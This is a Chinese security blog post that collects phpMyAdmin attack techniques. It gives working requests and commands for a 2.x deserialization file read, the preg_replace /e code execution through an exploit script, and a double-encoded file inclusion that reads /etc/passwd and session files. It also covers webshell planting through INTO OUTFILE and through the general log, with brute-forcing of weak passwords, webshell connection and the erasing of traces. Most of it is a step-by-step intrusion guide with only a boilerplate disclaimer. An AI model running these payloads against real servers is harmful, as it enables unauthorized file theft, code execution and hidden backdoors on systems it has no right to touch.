#  【攻防实战】phpmyadmin-RCE集锦  
原创 平凡安全  平凡安全   2025-06-07 12:00  
  
## 「phpmyadmin反序列化漏洞」  
### 「漏洞描述」  
  
phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。  
### 「影响范围」  
  
2.x  
### 「实战过程」  
  
访问  
```
http://x.x.x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YY73ZNed4ZAOuC1TGFWGRrWQ2fraeo0icJyvqzuoGKsfZTdAr9QEVucw/640?wx_fmt=png&from=appmsg "")  
  
抓包，修改发送如下数据包，即可读取/etc/passwd：  
```
POST /scripts/setup.php HTTP/1.1


action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```  
  
漏洞证明：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YN6S6X11lCTOBqWq4U0yiapNz4aDH8kkeZFTnxQJaWHIOmzwZ6WhyUUw/640?wx_fmt=png&from=appmsg "")  
## 「phpmyadmin远程代码执行漏洞」  
### 「漏洞描述」  
  
phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。  
  
在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。  
### 「影响范围」  
  
4.0.10.16之前4.0.x版本  
  
4.4.15.7之前4.4.x版本  
  
4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）  
### 「实战过程」  
  
访问该页面，存在弱口令  
```
http://x.x.x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YarbiabC78D4DcwpgQftl7880OEwP2AYzpaL52gsLa09xhbZTIMTSZlA/640?wx_fmt=png&from=appmsg "")  
  
爆破进入后发现该php版本以及phpmyadmin版本信息，该版本存在远程命令执行漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YP5dMPJBszhLAOI6gEsTotT6YHU7hTgPn40E45OiamUlvfjbgVFaRjNw/640?wx_fmt=png&from=appmsg "")  
  
使用exp利用此漏洞：  
  
-u是用户 -p是密码，-d是可以写入的数据库，没有就新建一个。-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为prgpwn的表。  
```
python3 xxx.py http://x.x.x/ -u xxx -p xxx -d test -c "system('id');"

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YHuUBBr1CI8vFXcZxe30XI8n16M07Ric653Fkb5ehpRX7WVythSpk5dg/640?wx_fmt=png&from=appmsg "")  
  
成功执行命令，并且在test数据库下创建了一个名为prgpwn的表  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YaTic5tGdwiaOa2Ch3U9uBB0Arib4DqDGmS0Obwq3ib6XwOXc7YFzrY9Wgw/640?wx_fmt=png&from=appmsg "")  
## 「phpmyadmin远程文件包含漏洞」  
### 「漏洞简介」  
  
phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。  
### 「漏洞实战」  
  
访问url，即可进入phpmyadmin。配置的是“config”模式，所以无需输入密码，直接登录test账户。  
```
http://x.x.x

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YFrX7nrl1w9JOTAFahZdtzR2r9dicVhuKIbvyP1uSU9gomfWZvypMwDg/640?wx_fmt=png&from=appmsg "")  
  
构造任意文件读取的payload并进行访问：  
```
http://x.x.x/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

```  
  
可见/etc/passwd被读取，说明文件包含漏洞存在：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Y1jyUUvslaQiaR2jZDqzdzOiaoF8sj6wzaicyqf9h94exXoaw98yIem6Ug/640?wx_fmt=png&from=appmsg "")  
  
利用方式也比较简单，访问SQL语句的执行页面，可以执行一下  
```
SELECT '<?=phpinfo()?>

```  
  
然后查看自己的sessionid（cookie中phpMyAdmin的值），然后包含session文件即可。  
  
访问SQL语句的执行页面：  
  
执行一下  
```
SELECT '<?=phpinfo()?>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Yda9ibvhiaP7YFV25FXmjCpScEscibovd2II1YrAAUbq1XicDxwLkZZn20A/640?wx_fmt=png&from=appmsg "")  
  
然后查看自己的sessionid（cookie中phpMyAdmin的值）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YJXglu5u8rvruAibjOcfaDsGym2icibpb1qyqgQ0ZP3FbZGibUpLKCBSVBw/640?wx_fmt=png&from=appmsg "")  
  
然后包含session文件：  
```
http://x.x.x/?target=tbl_zoom_select.php?/../../../../../../tmp/sess_xxxxx...  

```  
  
成功包含phpinfo页面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YaswQryw80ibQJ9iaBsicwJrgLql57MhxqygIjOaUiaeMclz5G242QgTopA/640?wx_fmt=png&from=appmsg "")  
## 「select into outfile写入webshell」  
  
首先查看查看secure_file_priv值  
```
show global variables like '%secure%';

```  
  
secure_file_priv的值如图所示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YdLQObk8a5Jt5picZib79K2y3Rf4bKaribzZsysMfbbsUIHRqDqlOBMl8Q/640?wx_fmt=png&from=appmsg "")  
  
写入一句话  
```
select 'xxx' INTO OUTFILE 'xxx.php'

```  
  
这里需要注意的一个点是路径需要用”\“  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YGzRt3xx0YGFOicfNlibvB0OK5gIj6DOsZGicvpCOZ0vicfdp5DMON6RAvQ/640?wx_fmt=png&from=appmsg "")  
  
成功连接webshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Y3INgh6eBxBXw3JqvOjAaKgleZqRspuvwEOe7U14rVxpLGQvDDmAmPA/640?wx_fmt=png&from=appmsg "")  
## 「phpmyadmin日志写入webshell」  
  
先查看general log是否开启  
```
show variables like '%general%';

```  
  
打开general_log日志读写功能  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YVT858jFLMicicxdn0H4ElcyNYam0cibaj1tytqLjPJN594hvzTsQHDaSw/640?wx_fmt=png&from=appmsg "")  
  
制作一个木马文件，要根据图中general_log_file中的绝对路径  
```
SET GLOBAL general_log_file='xxx.php'

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Yic9mrvSbXNDyvoRmuOfdfPLjkewz4D0hpZuYmibica9baqmRia43ejVvHg/640?wx_fmt=png&from=appmsg "")  
  
往这个木马文件中写入一句话  
```
SELECT 'xxx'

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YCCqhvXqpsdv0Nibnibbdg99Ayv3nrWkicdFRlpEGb6pPYgBCrPygy3U4g/640?wx_fmt=png&from=appmsg "")  
  
使用phpinfo验证  
  
利用过程  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Ytxw0ic6FmOVKHwhvdicRYXkGZb0kHqXXB4vOKL2zNZKm2K3Io9tp3lsg/640?wx_fmt=png&from=appmsg "")  
  
蚁剑连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7Ybeu64tov7xSia7x3ja3WkvX93rx7Zgqgm3KxGsuatNAQqp7e5x4oGBw/640?wx_fmt=png&from=appmsg "")  
  
最后抹除痕迹  
## 「攻防交流群」  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpyCgzPtoL0dslz4iaHpdiaK7YCkw3RrjtwetaaGricxewahXSh6fTicyOT3GBicHzPnhL1iay7stibtCiaE0g/640?wx_fmt=jpeg&from=appmsg "")  
## 「声明」  
  
文笔生疏，措辞浅薄，敬请各位大佬不吝赐教，万分感谢。  
  
免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。  
  
转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。  
  
